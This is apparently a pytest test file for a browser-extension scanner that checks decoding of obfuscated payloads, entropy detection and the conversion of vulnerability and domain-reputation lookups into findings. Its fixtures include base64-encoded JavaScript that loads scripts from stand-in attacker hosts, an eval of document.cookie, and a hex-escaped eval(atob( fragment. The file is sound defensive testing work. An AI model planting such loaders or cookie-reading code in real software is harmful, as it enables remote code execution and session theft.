import base64
from types import SimpleNamespace

from extanalyze.analysis import deep
from extanalyze.analysis.code_review import review_directory
from extanalyze.analysis.deep import deobfuscate


def _extract(tmp_path, files: dict[str, str]):
    for name, content in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    return SimpleNamespace(
        tmp_dir=tmp_path, files=list(files), js_files=[f for f in files if f.endswith(".js")]
    )


def _run(tmp_path, files, monkeypatch, retire=None, vt=None):
    monkeypatch.setattr(deep, "retire_scan", lambda rel, content: retire or [])
    monkeypatch.setattr(deep, "lookup_domains", lambda domains: vt or [])
    ex = _extract(tmp_path, files)
    review = review_directory(ex.tmp_dir, ex.files)
    deep.run_deep_analysis(ex, review)
    return review


def test_base64_payload_is_decoded_and_rescanned(tmp_path, monkeypatch):
    blob = base64.b64encode(b"importScripts('https://hidden.evil.test/p.js')").decode()
    review = _run(tmp_path, {"a.js": f"var x = '{blob}';"}, monkeypatch)
    ids = {f.rule_id for f in review.findings}
    assert {"CR-DEEP-DEC", "CR-DYN-003"} <= ids
    assert "hidden.evil.test" in review.external_domains
    assert review.deep is True


def test_decoded_findings_are_labelled(tmp_path, monkeypatch):
    blob = base64.b64encode(b"eval(document.cookie + 'xxxxxxxxxxxxxxxxxxxx')").decode()
    review = _run(tmp_path, {"a.js": f"var x = '{blob}';"}, monkeypatch)
    f = next(f for f in review.findings if f.rule_id == "CR-DYN-001")
    assert "[decoded base64]" in f.locations[0].file


def test_charcode_and_hex_escapes(tmp_path):
    text = "String.fromCharCode(104,116,116,112,115,58,47,47,97,46,98,46,99) + '\\x65\\x76\\x61\\x6c\\x28\\x61\\x74\\x6f\\x62\\x28'"
    kinds = {k for k, _, _ in deobfuscate._decode_candidates(text)}
    assert {"fromCharCode", "hex escape"} <= kinds


def test_entropy_flags_random_strings_not_prose(tmp_path, monkeypatch):
    random_like = "aZ3kQ9xL2mP7vB5nR8tY1wC4dF6gH0jS"
    review = _run(
        tmp_path,
        {"a.js": f"var k='{random_like}'; var t='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';"},
        monkeypatch,
    )
    ent = [f for f in review.findings if f.rule_id == "CR-DEEP-ENT"]
    assert len(ent) == 1 and ent[0].count == 1


def test_retire_and_vt_become_findings(tmp_path, monkeypatch):
    retire = [
        {
            "component": "jquery",
            "version": "1.6.0",
            "file": "a.js",
            "detection": "filename",
            "vulnerabilities": [{"severity": "high", "identifiers": {"CVE": ["CVE-2020-1"]}}],
        }
    ]
    vt = [{"domain": "bad.test", "malicious": 5, "suspicious": 0}]
    review = _run(tmp_path, {"a.js": "1;"}, monkeypatch, retire=retire, vt=vt)
    by_id = {f.rule_id: f for f in review.findings}
    assert by_id["CR-DEEP-RETIRE"].severity == "HIGH"
    assert by_id["CR-DEEP-VT"].severity == "CRITICAL"
    assert review.retire_js and review.vt_results


def test_vendor_files_skip_entropy_and_decoding(tmp_path, monkeypatch):
    blob = base64.b64encode(b"importScripts('https://x.evil.test/p.js')").decode()
    review = _run(tmp_path, {"lib/a.js": f"var x='{blob}';"}, monkeypatch)
    assert not any(f.rule_id == "CR-DEEP-DEC" for f in review.findings)
